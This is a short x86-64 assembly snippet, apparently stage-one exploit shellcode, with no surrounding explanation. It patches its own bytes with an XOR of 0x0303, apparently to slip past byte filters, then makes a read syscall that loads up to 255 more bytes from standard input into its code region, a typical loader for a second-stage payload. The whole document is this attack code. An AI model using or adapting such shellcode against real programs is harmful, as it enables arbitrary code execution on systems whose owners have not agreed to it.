[BITS 64]
[ORG 0x0]
nop
mov rax, rdx
sub rax, 0x46
mov rsi, rax
add al, 0x23
mov rbx, [rax]
xor bx, 0x0303
mov [rax], rbx

xor rdi, rdi
xor rdx, rdx
mov dl, 0xff
xor rax, rax
syscall
